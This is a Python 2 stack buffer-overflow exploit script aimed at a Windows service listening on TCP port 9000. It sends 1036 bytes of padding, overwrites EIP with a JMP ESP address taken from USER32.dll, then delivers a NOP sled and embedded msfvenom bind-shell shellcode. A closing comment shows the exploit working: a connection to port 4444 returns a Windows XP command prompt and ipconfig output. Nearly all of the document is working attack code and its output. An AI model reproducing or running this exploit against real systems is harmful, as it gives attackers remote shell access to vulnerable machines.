#!/usr/bin/python

import socket,sys

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect((sys.argv[1], 9000))

# /usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb -q 69423569
# [*] Exact match at offset 1036
buffer = "A" * 1036

"""
Run the program
View -> Executable Modules -> USER32.dll
Search for -> Command -> JMP ESP -> Note tha address
Replace BBBB with the address
This address will jump back to where the shellcode is located
"""

buffer += "\x53\x93\x42\x7e" # EIP Overwrite

buffer += "\x90" * 25

# msfvenom -p windows/shell_bind_tcp -f c -a x86 -b '\x00' 
buffer += ("\xdb\xdd\xb8\x4d\xa0\xf7\xa3\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x53\x31\x42\x17\x03\x42\x17\x83\xa7\x5c\x15\x56\xcb\x75\x58"
"\x99\x33\x86\x3d\x13\xd6\xb7\x7d\x47\x93\xe8\x4d\x03\xf1\x04"
"\x25\x41\xe1\x9f\x4b\x4e\x06\x17\xe1\xa8\x29\xa8\x5a\x88\x28"
"\x2a\xa1\xdd\x8a\x13\x6a\x10\xcb\x54\x97\xd9\x99\x0d\xd3\x4c"
"\x0d\x39\xa9\x4c\xa6\x71\x3f\xd5\x5b\xc1\x3e\xf4\xca\x59\x19"
"\xd6\xed\x8e\x11\x5f\xf5\xd3\x1c\x29\x8e\x20\xea\xa8\x46\x79"
"\x13\x06\xa7\xb5\xe6\x56\xe0\x72\x19\x2d\x18\x81\xa4\x36\xdf"
"\xfb\x72\xb2\xfb\x5c\xf0\x64\x27\x5c\xd5\xf3\xac\x52\x92\x70"
"\xea\x76\x25\x54\x81\x83\xae\x5b\x45\x02\xf4\x7f\x41\x4e\xae"
"\x1e\xd0\x2a\x01\x1e\x02\x95\xfe\xba\x49\x38\xea\xb6\x10\x55"
"\xdf\xfa\xaa\xa5\x77\x8c\xd9\x97\xd8\x26\x75\x94\x91\xe0\x82"
"\xdb\x8b\x55\x1c\x22\x34\xa6\x35\xe1\x60\xf6\x2d\xc0\x08\x9d"
"\xad\xed\xdc\x08\xa5\x48\x8f\x2e\x48\x2a\x7f\xef\xe2\xc3\x95"
"\xe0\xdd\xf4\x95\x2a\x76\x9c\x6b\xd5\x69\x01\xe5\x33\xe3\xa9"
"\xa3\xec\x9b\x0b\x90\x24\x3c\x73\xf2\x1c\xaa\x3c\x14\x9a\xd5"
"\xbc\x32\x8c\x41\x37\x51\x08\x70\x48\x7c\x38\xe5\xdf\x0a\xa9"
"\x44\x41\x0a\xe0\x3e\xe2\x99\x6f\xbe\x6d\x82\x27\xe9\x3a\x74"
"\x3e\x7f\xd7\x2f\xe8\x9d\x2a\xa9\xd3\x25\xf1\x0a\xdd\xa4\x74"
"\x36\xf9\xb6\x40\xb7\x45\xe2\x1c\xee\x13\x5c\xdb\x58\xd2\x36"
"\xb5\x37\xbc\xde\x40\x74\x7f\x98\x4c\x51\x09\x44\xfc\x0c\x4c"
"\x7b\x31\xd9\x58\x04\x2f\x79\xa6\xdf\xeb\x89\xed\x7d\x5d\x02"
"\xa8\x14\xdf\x4f\x4b\xc3\x1c\x76\xc8\xe1\xdc\x8d\xd0\x80\xd9"
"\xca\x56\x79\x90\x43\x33\x7d\x07\x63\x16")

buffer += "C" * 1500

sock.send(buffer)

print sock.recv(4000)

sock.close()

"""
c 192.168.1.12 4444
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\kanishka\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

        Connection-specific DNS Suffix  . : 
        IP Address. . . . . . . . . . . . : 192.168.1.12
        Subnet Mask . . . . . . . . . . . : 255.255.255.0
        Default Gateway . . . . . . . . . : 192.168.1.1

Ethernet adapter Bluetooth Network Connection:

        Media State . . . . . . . . . . . : Media disconnected

C:\Documents and Settings\kanishka\Desktop>
"""
